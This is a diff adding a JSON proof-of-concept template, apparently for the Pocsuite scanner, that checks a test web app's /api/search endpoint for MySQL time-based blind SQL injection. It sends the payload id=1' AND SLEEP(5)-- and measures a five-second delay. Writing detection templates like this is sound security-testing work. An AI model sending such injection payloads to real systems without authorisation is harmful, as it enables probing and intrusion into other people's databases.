@@ -1,0 +1,39 @@
+{
+  "pocInfo": {
+    "vulID": "test-pocsuite-time-blind",
+    "version": "1",
+    "vulDate": "2025-11-27",
+    "createDate": "2025-11-27",
+    "updateDate": "2025-11-27",
+    "name": "MySQL Time-Based Blind SQL Injection (Test)",
+    "protocol": "http",
+    "vulType": "SQL Injection",
+    "author": "Potato",
+    "references": [],
+    "appName": "Test Web App",
+    "appVersion": "1.0",
+    "appPowerLink": "",
+    "desc": "测试基于时间的 SQL 盲注漏洞，使用 SLEEP() 函数检测",
+    "samples": []
+  },
+  "pocExecute": {
+    "verify": [
+      {
+        "step": "0",
+        "method": "GET",
+        "vulPath": "/api/search",
+        "params": "id=1' AND SLEEP(5)--",
+        "necessary": "",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "status": "200",
+        "match": {
+          "regex": [],
+          "time": "5"
+        }
+      }
+    ],
+    "attack": []
+  }
+}
